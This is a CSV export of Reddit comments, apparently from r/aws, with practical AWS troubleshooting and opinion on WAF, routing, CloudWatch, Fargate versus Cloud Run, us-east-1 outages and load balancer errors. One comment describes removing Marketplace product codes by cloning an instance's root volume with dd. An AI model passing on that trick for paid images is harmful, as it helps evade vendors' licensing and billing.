g8hno8p,j8844j,"Perhaps. If it was me, I would probably check for config files and logfiles, try and connect, see what happens if I try to install/uninstall, etc. It might be there for a legit reason, and has malfunctioned. An attacker isn't being too smart if he's filling your terminal with messages, so maybe it's more of a glitch than an injection. If that software isn't on there, there will need to be another explanation for the messages.",1.0
g89ipsx,j866x7,Check cloudtrail see if someone messed up anything on waf. Rules dont disppear like that,1.0
g8an7uw,j866x7,"u/Talkaws,just checked and last waf action wasn't a rule deletion. I'm sure rules just disappeared.",1.0
g8am4sd,j866x7,Check you're still in the correct region,1.0
g8amy5z,j866x7,I'm.,1.0
g897jsu,j85jzc,"Do you have other networks you can test it from to verify the same behaviour? Internet peering and routing is incredibly complex, and this is just the route your ISP is using so far as we know - other ISP's in canada may take direct routes, or they may be doing the same thing.

Although, as you likely tested, that network does some to be for us-east-1 if we're looking at  [https://ip-ranges.amazonaws.com/ip-ranges.json](https://ip-ranges.amazonaws.com/ip-ranges.json). Very odd.  


  {       ""ip\_prefix"": ""52.95.216.0/22"",       ""region"": ""us-east-1"",       ""service"": ""AMAZON"",       ""network\_border\_group"": ""us-east-1""     },  


If you want to PM me your public IP,  I can try to traceroute it from vancouver and report back.  


I would recommend a ticket to AWS support to get this sorted - because they're going to have to sort out their peering. They'll probably need your traceroute.",1.0
g89h97a,j85jzc,"Please, everyone read this enough times until you fully understand it, before opening a ticket with the output of a traceroute/tracert:


https://archive.nanog.org/meetings/nanog47/presentations/Sunday/RAS_Traceroute_N47_Sun.pdf

Your Friend,
Old-Ass Packet Flinger",2.0
g89iw1v,j85jzc,"I just tried setting my VPN to be in Montreal and then did a traceroute and it didn't go through Virginia that time! But then I set my VPN to be in Toronto, and the packets took a trip to AWS centers in Virginia and Seattle before going to AWS Montreal.",1.0
g89zdgj,j85jzc,"What makes you think the 52.95.219.214 is Ashburn?

PTR records lie.  Example: the hop takes 1ms longer than the previous one but the DNS suggests you went from across the continent.  Nah brah. 

IP Geolocation can be 99% bullshit, 1% guess

Follow the BGP prefix around from networking looking glasses if you want to narrow down the location.   Something is weird about that IP address though. The whole parent /13 subnet is indeed assigned to Amazon, but it doesn’t appear to be advertised in the global ipv4 routing table.  Is it just a hop in a traceroute?",1.0
g899h31,j85jzc,"GeoIP can sometimes be wrong or was it in the hostname. And you don’t really have options because it’s who AWS peers with and what IX they are using. Most of the internet runs through Virginia FYI. 

If you want to me totally private you’ll have to run it in  a private subnet",1.0
g892by2,j85gj1,"Don't do static for each user.  
  
You should be using the API Gateway. This can be cached (and invalidated) by cloudfront.  
  
- API Gateway Doc https://www.serverless.com/framework/docs/providers/aws/events/apigateway/  
- HTTP API Gateway Doc - https://aws.amazon.com/blogs/compute/announcing-http-apis-for-amazon-api-gateway/  
  
If you're familiar with building a CMS with PHP or NodeJS, you're mimicing that framework.  
  
The big thing to remember that ""HappyBoy55"" is not the User_ID. The User_ID is an unchangeable index that should be a number. The Username can be changed to anything UNIQUE.  
  
The second thing is that the URL you are entering is not pointing to a file, like a simple httpd server. You are parsing that URL and returning whatever you decide what that URL means.  
  
You may have the parser check the left side of the string equals the lowercase of ""https://www.xyz.com/user/"" and then throw the rest of the URL string to your user routine.",10.0
g8dhm4d,j85gj1,Thanks a ton ! :),1.0
g8903ua,j85gj1,"Build an SPA with a frontend framework like [https://vuejs.org/](https://vuejs.org/)

Angular and React are also great however they have much steeper learning curves.",1.0
g892jx6,j85gj1,"You could either use client-side rendering for these routes, or use server-side rendering e. g. with lambda@edge",0.0
g893297,j85acv,"Two things might work here: 
You can make alarms based on metric formulas. One of the expressions is RATE, so you can say if the rate of change in number of objects is greater than x.
https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Create-alarm-on-metric-math-expression.html

Anomaly detection might work in this case, and might offer more value than a simple alarm.",3.0
g8966lc,j85acv,"You could monitor the S3 PUT and POST Actions which would give a better idea of object create/modification velocity and magnitude. These metrics are available down to 1-minute, keeping in mind that there is some latency between API action and Metric calculation. From there, you could either:

1. Define an anomaly detection band and trigger an alert/event based on an abnormal event
2. Create a custom running/windowed metric and trigger an alert/event based on deviation within a defined period.

EDIT: These metrics can also be scoped to Bucket, Folder, and (I think) Object Prefix",2.0
g8cg0ar,j85acv,"In [alarms on metric math](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Create-alarm-on-metric-math-expression.html), if you have a metric with id **m** then **RATE(m) \* PERIOD(m)** is the difference between current datapoint and previous one.  

However, S3 `NumberOfObjects` metric is *only published once a day* so won't give you an alarm that will trigger within a minute of a high number of objects being created.

I think you are best off [enabling S3 Request Metrics](https://docs.aws.amazon.com/AmazonS3/latest/user-guide/configure-metrics.html) on your bucket and then simply alarm on **Sum** statistic of the `PutRequests` metric for the bucket, with period of the alarm set to 60 (seconds).  This will trigger when there are a high number of Puts for objects.  That would not exactly equate to ""new"" objects, since some of those Puts might be object overwrites, but might be perfect for what you need.",1.0
g8m138w,j85acv,"Thanks for the advice! On the S3 bucket, I've enabled this feature. However, on CloudWatch, I'm unable to create any new metrics - is there a ""Create New Metric"" button anywhere?",1.0
g8mwpum,j85acv,Metrics should just start flowing. If your S3 bucket gets put then the metrics will be visible in CloudWatch Console automatically,1.0
g89xhgu,j84ld1,Excellent AWS is catching up with Google quickly,1.0
g8c5s6o,j84ld1,Both still far behind databricks,1.0
g8pbk3v,j84ld1,agreed Goldenknightsfan702!,1.0
g891cdw,j84h22,"I want cloud run on AWS as well. 

Also, let us run our work loads past 15 minutes (the default can be 15, let us specify our own timeout, with no max ceiling).

I want these features, because I have use cases that would work well in a lambda-like architecture, but limited by not being able to use docker containers and the time outs (currently using other solutions to solve these problems, but they are kinda hacky imo).",21.0
g8a6xp9,j84h22,I think the idea is you would use fargate for your use case.,10.0
g8a7d8a,j84h22,"Already use it. It is part of the “hacky” solution that I mentioned previously.

Why:

* Lambda’s are **scale-as-it-happens**. Don’t have to manage scaling at all, but you can if you want. Downsides are cold starts, but this is not a problem for all workloads (i.e. asynchronous processing, system-to-system during asynchronous workflows, etc.). Also cold start times are only getting better-and-better as cloud providers improve their internal infrastructure (which is why we can use http api and lambda to create consumer facing services).
* ESC Fargate are **guess-your-scale**. You preemptively scale your containers using autoscaling groups. Avoids issues of cold starts, but you have to manage your scaling policies (how many containers get spun up and are shutdown). Downsides are managing more (unneeded in this case) configuration, not as intuitive or good of developer experience to use as Lambda, and custom scaling adds another area for bugs to be introduced. You could try to build your own auto scaling policy to mimic scale-as-it-happens, but that is still configuration to manage across your fargate projects. You won’t find a good generic one, because different workflows scale based on different api calls. Examples: http api call vs queue processing vs dynamodb vs s3 vs etc. (Compared to Lambda, which scales and works without needing to customize).",7.0
g8ltgnh,j84h22,"So what I believe the intent with fargate is that it's not guess-your-scale. But maybe it depends on your use case. For a workflow that takes over 15 minutes why not just dynamically start a fargate task? Sure it will take longer to start than lambda, but if for a task that takes greater than 15 minutes already maybe that is negligible? So instead of calling a lambda you just make a request specifying your fargate task.",2.0
g8mg6q4,j84h22,"Glad to discuss. This question revolves around one of its points being solved.

&gt; For a workflow that takes over 15 minutes why not just dynamically start a fargate task?

This problem is solved by default in Lambda and Cloud Run, that isn’t done by Fargate. 

You could have applications and policies dedicated to scaling Fargate containers, and I already have apps that do something similar.

So the answer to your overall question is “We can do it”, but it would be awesome to see more invocation in this space so teams don’t have to do all the customization and technology maintenance,

Saving developers’ time in the short and long term.",1.0
g8b1gos,j84h22,What's this got to do with Cloud Run?,-1.0
g8bqhe4,j84h22,"Already mentioned it before, but let me give me the TLDR:

I want

* Docker Containers
* scale-as-it-happens
* sensible defaults. Don’t have to manage scaling, but you can if you want

These features together are provided by cloud run, but not by any AWS service out there currently.",3.0
g88pv5x,j84h22,AWS might be working on something for that. It looks like Cloud Run depends heavily on Kubernetes functionality and AWS only relatively recently got into Kubernetes. AWS has been improving Fargate and this looks like it could be a natural evolution of that.,31.0
g89oqp9,j84h22,Fuck anything with some giant kube abstraction garbage on top. What a mess I don’t want to deal with.,14.0
g89ws6p,j84h22,"&gt;Fuck anything with some giant kube abstraction garbage on top.

It's completely transparent for cloudrun. Basically you just upload a docker image.",14.0
g89qg89,j84h22,"Wow. Someone is pretty salty about the worlds leading container orchestration tool, that out paces everything in development velocity, support, community, and corporate adoption. With literally thousands of hours of available training and too numerous to count free blogs and publications for knowledge sharing. Or the largest container based ecosystem of supporting technologies. 

Ever created in the history of computing.",-23.0
g89wv2f,j84h22,"I’ve had my first chance to work with someone who knows it in an out. It is much more convoluted than just using ECS. 

Needing that much training to get started is not a positive. I literally went from not knowing anything about ECS or Docker to having a full fledge production set up and pipeline running Node/C# APIs behind NGinx within a couple of days after reading a tutorial on the web and finding a Fargate cloud formation template. 

To upgrade the cluster, it’s just a matter of modifying  the image name in the template.",9.0
g89x2z9,j84h22,I’ve used it for years. You damn right I am. Unnecessary abstractions that offer no benefit over later under it are always a no go.,13.0
g8arz6b,j84h22,Mind expanding? I'm interested to know :),3.0
g8a1aqj,j84h22,You should do a talk at Kubecon about your issues.,2.0
g88vrnm,j84h22,EKS Fargate is in their pipeline I think right?,4.0
g88wjdt,j84h22,"By ‘in their pipeline’ do you mean they’re working on it or that it exists in their current offerings? 

Because it’s been a thing for about a year. https://aws.amazon.com/blogs/aws/amazon-eks-on-aws-fargate-now-generally-available/",29.0
g89fgwy,j84h22,ThIs is GCPs best product IMO and the only reason I would use GCP. Not sure why AWS is not all over it.,11.0
g896f2d,j84h22,"I love the idea of cloud run, though I have no real usecases for it yet. The ""scale to 0"" then boot for receiving traffic seems really cool, and really simple.

I'm like you, I've been waiting for a good long time for an equivalent to come out on AWS.  


I do genuinely enjoy GCP though, and I'm glad they're innovating because more competition by cloud providers = better infra for all of us.",6.0
g89pwgm,j84h22,"Outside of test environments, is scale to zero a real scenario?

With fargate + load balancer you can be elastic to whatever that means for the workload.

If you have true ""9 to 5 usage"" requiring 0 -- there's scheduling capabilities within ecs (and fargate)",6.0
g8aqdkg,j84h22,"Yeah it seems everyone gets a massive hardon for these hypothetical scenarios, and then ends up paying far above the actual cost of their base load. Like this ""I can run a webapp off lambda""... Cool?

A shitty ECS container is what? ten bucks a month? If you are doing any sort of engineering effort to reduce your baseline cost below that then holy crap does your business have other issues.",4.0
g895g69,j84h22,"After managing an ECS cluster for some time, I switched over to AWS Batch which had been great. Not sure if this fits your use case exactly (I have never worked in Google Cloud) as it follows the batch/queue model.  But for data processing, its great for submitting data to the queue, the compute resources provision themselves, and it all shuts down when its done if the queue is empty.",8.0
g88uxo2,j84h22,"Lambda ,  Fargate and Step Functions",16.0
g890je6,j84h22,"None of those are Cloud Run equivalents though. 

I'm still hoping for such product in AWS.",17.0
g89el9d,j84h22,"They are not the direct equivalent but can be used to setup what you want, i.e.  run a short lived container and only pay when you run it.  To elaborate a little bit... 

Lambda/APIGateway would be the entry point where you receive the request.  The lambda would run whatever task needs to be run in Fargate.  The step function would monitor state of the fargate task and could be used to provide feedback when the task completes.  

Since you are using tasks without a service wrapper you would only pay when it is running.  We use this pattern and it works very well.",6.0
g89fq27,j84h22,"You're then still limited by Lambda timeout of 15 minutes though. And also, it seems like lot of over engineering and complexity for me, that tasks could be easily done in a Cloud Run or Knative -like service but on AWS.",4.0
g89g6vs,j84h22,"The lambda isn’t running the task it’s invoking the task in fargate.  The step functions poll ECS fargate to get task status.  It’s not that complicated, it’s not as easy as the gcp service but it does deliver the same thing even though you have to set a lot of different pieces up.",11.0
g89ghn0,j84h22,"Ok now I understand. Yes, looks like a reasonable work around. I would be a bit concerned on ECS Fargate overhead when you need speed and throughtput, it depends on the kind of job I guess. Cloud run scales pretty fast.",4.0
g89qit8,j84h22,"One big advantage of Cloud Run is concurrency. Each lambda instance can only do one request at a time, so any time spent waiting on network requests (e.g. DB query) is basically money down the drain. A service under load on Cloud Run should be  more efficient than under Lambda if it does DB queries and other network requests.",8.0
g89bbow,j84h22,This is the correct answer.,7.0
g892bbh,j84h22,Or OpenFAAS on EKS if that's possible.,1.0
g89ord2,j84h22,"No, nope, nada.",-3.0
g89jrxy,j84h22,"As someone who runs Tensorflow in Lambda, i would love this. Though would cold starts be worse, or similar to lambda?",3.0
g89n6q9,j84h22,Also curious about the cold starts if anyone has any insight.,1.0
g89piiv,j84h22,"Lambda cold start equals (sum of):

- allocate eip (seconds)

- download code.zip (milliseconds)

- firecracker init (milliseconds)

- call your constructor (up to you)",5.0
g8apwiz,j84h22,"(Disclaimer: from Lambda)

 You don't pay for eip allocation on the invoke, so cold starts are really only in the second range if you got a big ol' zip AND do a lot in your initialization.",5.0
g8cv1q7,j84h22,I meant for cloud run,1.0
g89xygf,j84h22,"I imagine it’s coming, I’m really curious to see if it will come in the form of Lambda offering docker support or Fargate offering more seamless scale to zero support.",3.0
g89sdau,j84h22,"Never used it, do they boot the container on request like lambda or keep it warm somehow?",2.0
g8aaxqi,j84h22,"I have been bringing it up with our TAM and their team. I don't think they fully understand what it provides as they have not used it. If you guys have a TAM, you should request for this feature too. With more people requesting it, it could come faster",2.0
g8ajgkp,j84h22,Tried CodeBuild for this purpose?,2.0
g89g096,j84h22,"ECS Service on Fargate with autoscaling policies is the closest solution that resembles cloud run [https://docs.aws.amazon.com/AmazonECS/latest/developerguide/service-auto-scaling.html](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/service-auto-scaling.html) however, they don't support scale-to-zero.",1.0
g8b5mnm,j84h22,Fargate can scale down to 0 using its scaling policies.,1.0
g89mwdl,j84h22,"Looks like it’s container packaging on top of lambda runtime. 

Re:invent is around the corner, keep an eye.",1.0
g89pp3i,j84h22,I was *literally* just thinking how nice it would be if I could host a WordPress site on my AWS instance without being billed for having it on all the time. It would rarely receive traffic anyway. Aws free tier is so limited. Too bad github pages only allows static html,1.0
g8bpzqo,j84h22,You can easily run a wordpress site on aws under the free tier,1.0
g8bsmzy,j84h22,I said without being billed for having it be turned on all day.,1.0
g8bxzfd,j84h22,"If your usage is within free tier, you won’t be",1.0
g8c4bb2,j84h22,"Unless I read the details wrong, your charged by 1. 'time the instance is running up to 12 months free' or 2. 'until a data cap is reached by throughputting requests' whichever comes first.",1.0
g8a9tf2,j84h22,"Ok so check this out

They do

I don't know how, and I don't know why, but it's not in their documentation at all

And if you Google ""lambda application"" ..well good luck

But it exists.

You can just flat out deploy a (.net core in my company) application TO lambda, and it's the whole app, controllers, services, classes, interfaces, etc.

And it behaves and is billed as a lambda function.

A coworker of mine did it and I just couldn't believe it

I even tried looking in docs on how to do it myself.

I haven't dug in, but I assure you it's there 

Granted, it's not a container we provide - though with fargate + spot instances you could get closish 

It's a full app passed to lambda",1.0
g8am3t1,j84h22,Are you using lambda custom runtimes for this?,1.0
g8cwvnk,j84h22,"I am so embarrassed but I don't know

I think I saw lambda applications in the UI when he was showing me",1.0
g8aqotr,j84h22,why is not just a lambda? is there something else you usually do to a dotnet core lambda?,1.0
g8cx0o9,j84h22,"Typically it's single functions

This is an app that was hosted on an on premise server fronted by IIS",1.0
g8ax2kq,j84h22,Where’s that logo come from?? I’ve not seen it on aws before I don’t think...,1.0
g8b5f2f,j84h22,Isn’t that Fargate?,1.0
g8b6j7l,j84h22,Isn’t that what fargate is?,1.0
g89op4h,j84h22,Because AWS is behind and are just happy to take your money through their convoluted ways.,-8.0
g88rney,j83zbq,"If you look at the details of the AMI (console, cli, etc) you will see a Product Codes section.  This will tell you what billing constructs are in place for that ami.  An image copy should copy the billing codes.",2.0
g88xe4x,j83zbq,"Thank you ! I just confirmed that my private image has inherited the product code. That makes perfect sense, once you know what to look for. I'm guessing the EC2 instance inherits the product code from the AMI and every time you create a new AMI any product codes attached to the EC2 get embedded with the new AMI.",1.0
g8azfgj,j83zbq,"The product codes are usually tied to the EBS volumes, which persist across snapshots / AMIs and ultimately to new instances.

Not that I condone this AT ALL for paid products, but for things like CentOS that are free, product codes can be removed. Product codes usually come with annoying limitations like not being able to add volumes while the instance is running, not being able to choose whatever instance type you want (you’re limited to what they make available), etc.

To get around it, attach a new EBS volume and DD the root volume across to the new one. Stop the instance, attach the cloned one in its place and voila, no more annoying marketplace ties.",1.0
g8bhwfw,j82dai,"Kinesis could work, but if you’re already in AWS: might want to look at the chime sdk. https://github.com/aws/amazon-chime-sdk-js

Since it’s meant for doing video calling, might be better than kinesis.",3.0
g8c9jy0,j82dai,"This, I'd do this.",1.0
g8cd30l,j82dai,Yeah me too im working on it now and it looks amazing,1.0
g8cd4cx,j82dai,Thank you so much you saved my life,1.0
g88kosx,j82dai,"I guess you'd use Kinesis Video Stream WebRTC SDK for Javascript: [https://github.com/awslabs/amazon-kinesis-video-streams-webrtc-sdk-js](https://github.com/awslabs/amazon-kinesis-video-streams-webrtc-sdk-js)

[https://aws.amazon.com/es/blogs/media/enabling-video-chats-using-amazon-kinesis-video-streams-for-webrtc/](https://aws.amazon.com/es/blogs/media/enabling-video-chats-using-amazon-kinesis-video-streams-for-webrtc/)

&amp;#x200B;

Here it's an example with React Native + WebRTC:

[https://medium.com/@skyrockets/react-native-webrtc-video-calling-mobile-application-26223bf87f0d](https://medium.com/@skyrockets/react-native-webrtc-video-calling-mobile-application-26223bf87f0d)",1.0
g8916to,j82dai,so i've to implement the Kinesis Video Stream WebRTC SDK for Javascript in the RN app or what?,1.0
g8977h2,j82dai,Pretty much.,1.0
g8a27t7,j82dai,Thank you so much for your help,1.0
g8akyyn,j82j9b,The most common reason for a 502 I experience with ALB is the application response being malformed. I use ALB frequently for work with Golang Lambdas; if the response does not adhere to the exact specified format (including headers) the ALB returns 502 without explaining why.,1.0
g8m0k3z,j82j9b,"Man, AWS is a nightmare.  I can't even get ALB logs working with an S3...",1.0
g88ei1m,j80gsj,Tangential: you probably shouldn't use AWS as the acronym for WorkSpaces,2.0
g89no0x,j80gsj,Thanks for the heads up,1.0
g89neux,j80gsj,I have the same issue!,2.0
g89nnk3,j80gsj,And you're an employee! Please let me know if you figure anything out,1.0
g8a9a2r,j80gsj,install the printer driver on the workspace and enable advanced printing through group policy,1.0
g8a9yg0,j80gsj,An IT admin would have to enable advanced printing through group policy?,1.0
g8bwsgl,j80gsj,yes,1.0
g87ybyy,j7zcvq,"I can’t get to the boto docs on my phone. But, try the Boto equivalent of the describe instances command. It has built in filters. 

https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-instances.html",2.0
g87o8ud,j7xvib,"Oh look it’s us-east-1 having problems. 

Who ever could have guessed this would happen.",66.0
g87rm9m,j7xvib,"Not sure why you're being downvoted. Most of the az or regional issues AWS experiences happen in us-east-1. It's the oldest region, most hardware development happens there, and it has some of the more difficult customer requirements.",25.0
g88429i,j7xvib,"It’s just a cliché: it’s also the most used region so you see the most complaints about problems but most people forget to correct for the fact that only the people affected are going to say something about it.

I’ve had a public website hosted in us-east-1 for a decade using multiple AZs and measured 17 minutes of downtime when they had that network issue in 2011, and a few hours of elevated errors when they had that widespread S3 issue a few years back. None of the other incidents have had any user-visible impact despite all of the “zomg! us-East-1 is on fire 🚨 🚨 🚨” threads from the people who were only using one AZ (e.g. everyone using Heroku for years) or trying to really aggressively cost-optimize at the expense of robustness.",17.0
g89bodh,j7xvib,"Soooo all the monitoring, alerts and failures of core AWS infra is bs because you host a website there. 

Happen to have non-anecdotal data for this?",-7.0
g89dbt2,j7xvib,Read a bit more closely: the point is not that everything is always perfect but that there's a big selection bias in that people who's stuff is working don't chime in on those threads and that if you follow long-running recommend reliability practices most of these problems will be visible on your *internal* monitoring but they won't be *externally* visible to your users.,7.0
g89nvro,j7xvib,"There \_may\_ be a selection bias (which you have no data of), but that doesn't mean your website is a great indicator of the stability of AWS.    Especially compared to actual people \_within\_ AWS saying ""Don't use this region.""

Frankly, I think you're afraid of moving and are finding reasons to justify this.",-5.0
g8a025b,j7xvib,"The point, again, is that if you follow recommended practices the experience is unlikely to resemble what you'd see in a thread full of the stressed people who are having a problem. I work on a number of accounts using all of the US regions (and the same story on GCP) and am not exactly going out on a limb saying that the reason why AWS (and experienced operators before them) recommend redundancy in depth is because it works. 

I've never heard someone in AWS say “don't use us-east-1” but they will all tell you that you should use multiple zones, regions, or even other clouds to the extent needed to meet your reliability goals. I've had perfectly fine results for that longest running site in us-east-1 but other projects have more paranoia (and budget) and may go for either hot-failover or active-active instead.",3.0
g8a4e50,j7xvib,"So there’s the cop out.  

Most folks do multi AZ.  Doing multi-region takes a decent bit more work and consequently money. 

Just stop trying to justify a region that blows up regularly.  Please.

Edit: all the regions?   Are you really rocking LA hard or is this bs?",-4.0
g88zpxj,j7xvib,"AWS reps told our company that it's known for going down more often (typically) due to the fact that bleeding-edge releases tend to hit us-east-1 first.

I'm sure it's a combination of factors, but I thought that was interesting.",3.0
g88o4i5,j7xvib,Also there's a bunch of CloudFront-related stuff that only runs in us-east-1. I'm sure there's a great technical reason this should be the case but I feel like it makes that a SPOF. That said I take it they make everything nice and redundant and HA.,3.0
g8asf3x,j7xvib,I recall ACM and Lambda@Edge need to start there if you need to make it work with Cloudfront.,1.0
g8axrqh,j7xvib,That's correct and it was actually exactly what I was thinking of. To use an ACM certificate with CloudFront it needs to be in VA and so do any Lambda@Edge functions.,1.0
g897m87,j7xvib,"I saw a post here a few weeks ago where AWS TAMs said their is an internal joke of ""friends don't let friends use us-east-1 and it sort of unsettled me. Makes me consider moving all my workloads to a different region",4.0
g89bbxv,j7xvib,"Dude, move your aws workloads to another region. 

Like for real.  Ohio is nice.  :)",2.0
g87si3q,j7xvib,I'm sure us-east-1 is AWS's QA environment.,9.0
g88m2fi,j7xvib,us-east-1 is their prod environment,5.0
g8al5d0,j7xvib,"I'm half joking. Over that last few years us-east-1 has had more issues than all other regions put together.

It's still far more stable than company built datacenters though. I still have nightmares about crappy diesel generators that work perfectly in testing and never when you need them, crappy power switching equipment that jams, tape silos that need a weekly kicking, random cable failures, and all the other maddness that AWS saves me from.

I'm not knocking AWS's reliability. They are still wonderful. Even us-east-1.",1.0
g893i1t,j7xvib,"Aww you think that companies don't have the mindset of prod =/= QA, how cute",-4.0
g893mol,j7xvib,[deleted],-2.0
g893uu5,j7xvib,*Whoosh*,0.0
g893xcl,j7xvib,[deleted],-1.0
g8ajcyx,j7xvib,"The dude was making a joke, and you took it entirely too seriously.",2.0
g87o0sj,j7xvib,"I had a spot instance lose network connectivity around 440am pst and wake me with alerts. Annoying, but I rarely have issues, so I’ll try not to complain.",8.0
g886lcb,j7xvib,I had spot capacity across multiple instance types completely wiped out within minutes for the first time in over a year. Good thing I don't run production on spot :-).,5.0
g8871pr,j7xvib,I'm using [Autospotting](https://github.com/AutoSpotting/AutoSpotting) in production with a few on-demand as backups. It works really well and saves us around %70 in costs.,6.0
g88b1re,j7xvib,"Like I said, I can't afford to lose hundreds of instances at the same time in prod. Even for development it's an issue when 70% of capacity (rest is on demand) goes down at the same time like I saw this morning.

This drill happens approximately once a year to make you aware of the possibility :-).

Possible savings in my case are not important when comparing to possible loss of revenue.",3.0
g88c9q1,j7xvib,"Yeah, I understand. My load is probably not as sensitive to minor downtime as yours, although we have very little if any.

Were your instances given the 2-minute warning, or did they lose the network connectivity completely? Usually, the 2 minutes is enough time for my autoscaling group to replace them with on-demand without losing capacity. Auto spotting them replaces the on-demand slowly, where available.",0.0
g894s0b,j7xvib,"Yes, we got the 2 minute warning. Unfortunately it takes ~5min to shift the workload to other instances when we lose capacity.",1.0
g88injx,j7xvib,You should be designing for failure. Losing anything short of an entire region should be a non-event. It certainly shouldn't be pageable.,4.0
g88m3ly,j7xvib,"Yep. At the bare minimum have the app in each AZ.. One AZ goes down, no issue - probably wouldn't even notice.",2.0
g88xzww,j7xvib,"Yup, that was one of many instances. I have a large cluster spread through multiple AZs. It was not a problem at all for me.",1.0
g8hv3rd,j7xvib,/me crying in legacy architecture software SaaS,1.0
g87n2m4,j7xvib,"Not sure if it is the same event, but we started getting 503 responses from Kinesis at about 01:41 EDT us-east-1",4.0
g8bdusb,j7xvib,"Wrote a script to blacklist AZ from ASGs when ths happens. Feedback welcome :)   


[https://github.com/awsiv/asg-az-update](https://github.com/awsiv/asg-az-update)",2.0
g88czvh,j7xvib,"~~Isn't that the AZ that isn't getting new instance types and which is masked off from newer accounts?~~

Correction: no it's not.",1.0
g88edxl,j7xvib,i thought that was use-az3?,3.0
g88h1ci,j7xvib,I just checked and you're right.,1.0
g88n8rk,j7xvib,There is not much point in mentioning your AZ letters since they do not map to the same letters from account to account.,1.0
g890glt,j7xvib,Unless you use [AZ IDs](https://docs.aws.amazon.com/ram/latest/userguide/working-with-az-ids.html),6.0
g885cf2,j7xi2z,"I wouldn't lose my sleep over it unless the testers report false positives caused by the modifications.
We are regularly asked to disable firewalls and provide full network access and that's ok for the reasons they gave to you. At the end of the day e.g. an edge firewall might prevent them from discovering internal misconfigurations so they need to be able to peak inside.",2.0
g89nc5p,j7xi2z,"&gt; I wouldn't loose my sleep over it

lose",0.0
g87wugs,j7uxk0,"We do see this occasionally...  I'm not sure who thinks that ""temporarily reducing your request rate"" is a reasonable thing to impose upon Lambda customers :-).

We fail-over to another region when it happens - never considered having a failover to ECS or EC2 as an alternative.",2.0
g89pevk,j7uxk0,Wow I had no idea this was possible...thats quite unfortunate!,1.0
g87gerd,j7uopz,How many times do you run that lambda function per day?,1.0
g88jblp,j7uopz,\~300 times.,1.0
g8begi4,j7vcup,"Followup script :)

Update/remove faulty AZ from ASG so new instances are not launched there:

[https://github.com/awsiv/asg-az-update](https://github.com/awsiv/asg-az-update)",1.0
g87yrve,j7vcup,Appreciate this!,1.0
g87o0r4,j7vcup,"Know your audience. Here at /r/AWS the overwhelming majority of the users use the web console, not the CLI.

To map zone names to zone IDs, simply go to the Resource Access Manager in the console and you’ll see them listed on the right side.",-14.0
g883hot,j7vcup,"I don’t agree with you - me myself, I have found lots of tips, codes and technical resources which are not necessarily related to aws console. And that’s one of the main reasons I follow this community",3.0
g8afe8w,j7vcup,An overwhelming percentage of the CASUAL audience use the web console. The vast majority of the serious audience... who are also the type of people that might actually care about this information... are the ones using the CLI/API.,2.0
g8ag64p,j7vcup,"Have you noticed all the posts about how ""bad"" the Route53 console is now? That's a pretty good sample of this subreddit. Virtually no one here knows how to use the CLI or API. It's actually pretty embarrassing and explains the weekly ""Help I got charged $xxxx"" posts.",1.0
g8auzy9,j7vcup,"Nah man, I'm one of the people bitching about that change and I do 95% of my aws interactions via boto3. The fact that people noticed it sucks doesn't mean they're not using CLI or API.",3.0
g87ym35,j7uu19,You have to install a Code Deploy agent on the EC2 instance. Then you just add bash commands to the appspec.yml file.,3.0
g86ugbs,j7rfiq,"Global Accelerator would be easier than NLB. Create a GA, point it to your ALB, and then use the pair of static IPs provided by GA.

It’ll be roughly the same cost as NLB without the messiness.",4.0
g86jzqn,j7rfiq,"Route53 is the preferred solution, 

If not NLB-&gt;ALB-&gt;instances will work.",4.0
g86kjgm,j7rfiq,The top level domain is not currently supported by Route53 unfortunately. Good to hear NLB to ALB can work out. Thanks!,1.0
g86x0b1,j7rfiq,"&gt; The top level domain is not currently supported by Route53 unfortunately 

I'm pretty sure Route 53 will host any TLD, and the restriction on which TLDs are available is only if you're also purchasing the domain through Route 53... domains purchased at another registrar should work if you point the NS stub record at the servers Route 53 gives you, AFAIK.",4.0
g888clh,j7rfiq,Good to know. Thank you!,1.0
g86trsv,j7rfiq,"For an ALB, you need to use an A record with an ALIAS to the route 53 CNAME. This bypasses the issue with having a CNAME on the root (@) domain. Route 53 will resolve the root domain to an A record internally.

Source: [https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-to-elb-load-balancer.html](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-to-elb-load-balancer.html) (""You can create an alias record both for the root domain, such as example.com, and for subdomains, such as www.example.com"")",4.0
g884uji,j7rfiq,this is the answer,1.0
g86wyfa,j7rfiq,"You can always use Route53 as DNS, even if it doesn’t support your TLD as a registrar. Those are two different things. 
If you want your root domain to point to a load balancer (or cloudfront for that matter), using R53 for dns is the best choice.",3.0
g888b8m,j7rfiq,I see. That’s really good to know. Thanks!,1.0
g86qtvw,j7rfiq,Yeah it's against RFC to have a CNAME on a root zone.,1.0
g86mkcm,j7r0kv,"Are you logging the container?

How did you set up target group health checks?",3.0
g86mucv,j7r0kv,"Not exactly sure what you mean by that.. I can see the logs from AWS Fargate and I can confirm that the container IS absoutely running. In fact I can connect to the application in the container, before I put up the ALB, so I'm 99% sure that this is NOT a container issue, otherwise I wouldn't be able to connect from the Public IPv4 address and port.

As for health checks the are just pointing to /. Which should work as all it's looking for is 200 response... I told the health check to use the port that the other security group (that's connected to AWS Fargate) is using to connect to the container...",1.0
g86nlnl,j7r0kv,"Just to be clear, there is at least one healthy target in the target group?",2.0
g86omw2,j7r0kv,"Not sure I've torn it down... I'll check in a few minutes.

EDIT: u/jxd73 I can confirm that I've got at least one healthy target in the target group.",1.0
g894frn,j7r0kv,"While I'm not sure what the problem is, I have a CDK application you can quickly deploy that builds the infrastructure you want.

* [https://github.com/jonberke/iac-simple-api/tree/main/ecs](https://github.com/jonberke/iac-simple-api/tree/main/ecs)

(Here's my [blog post that accompanies that repo](https://outwiththeold.info/posts/simple-api-iac/).) 

Maybe you can stare-and-compare what that stack builds vs. what you put together.",1.0
g894qdt,j7r0kv,"If you have a healthy target group on the load balancer, but the load balancer is throwing a 503, then you most likely have an issue with your security group configuration, listener rules or possibly you have configured the traffic port &amp; health check port differently? You said your ALB is listening on 443. Have you configured a certificate on the ALB? 
Which protocol are you using? 
Since you're using an ALB, which doesn't support TCP, ill assume your using HTTP. In which case, you're likely offloading SSL to the load balancer. Are you certain you have configured the traffic port correctly?

If we could see your templates, it would help :)",1.0
g898lar,j7r0kv,"Here is a complete working CF template that will set up everything correctly for you. 

https://github.com/1Strategy/fargate-cloudformation-example/blob/master/fargate.yaml",1.0
